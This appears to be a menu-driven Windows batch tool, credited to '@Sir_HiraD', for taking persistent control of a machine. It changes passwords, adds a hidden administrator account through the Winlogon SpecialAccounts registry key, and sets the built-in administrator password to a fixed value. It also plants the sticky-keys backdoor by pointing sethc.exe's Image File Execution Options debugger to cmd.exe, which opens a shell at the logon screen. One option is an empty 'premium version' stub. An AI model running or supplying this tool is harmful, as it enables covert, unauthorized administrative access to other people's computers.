echo off
color A
cls
:MENU
ECHO  1- Change Password
ECHO  2- Create Hidden User
ECHO  3- Set Password Default = pass!@#123
ECHO  4- Create Backdoor
echo  5- Delete Backdoor
echo  6- Set password on Backdoor
ECHO. 
SET /P M=Choice the number then press ENTER:
IF %M%==1 GOTO ChangePass 
IF %M%==2 GOTO HiddenUser 
IF %M%==3 GOTO SetPass 
IF %M%==4 GOTO CreateBackdoor 
IF %M%==5 GOTO DeleteBackdoor 
IF %M%==6 GOTO SetPasswordBackdoor

:ChangePass
cls
REM "@Sir_HiraD / Change Password"
REM ------------------------------
@echo off
set /p user=Please Enter Your Username:
set /p pass=Please Enter Desired Password:
net user %user% %pass%
GOTO MENU

:HiddenUser
cls
REM "@Sir_HiraD / Create Hidden User"
REM ------------------------------
@echo off
set /p user=Please Enter Desired Username:
set /p pass=Please Enter Desired Password:
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
GOTO MENU

:SetPass
cls
REM "@Sir_HiraD / Set Password Default"
REM ------------------------------
@echo off
net user administrator pass!@#123
GOTO MENU

:CreateBackdoor 
cls
REM "@Sir_HiraD / Create Backdoor"
REM ------------------------------
@echo off
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe
GOTO MENU

:DeleteBackdoor
cls
REM "@Sir_HiraD / Delete Backdoor"
REM ------------------------------
@echo off
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
GOTO MENU

:SetPasswordBackdoor
cls
REM "@Sir_HiraD / Delete Backdoor"
REM ------------------------------
@echo off
echo This Command there is Premium Verison. Please Buy Permium Verison
GOTO MENU


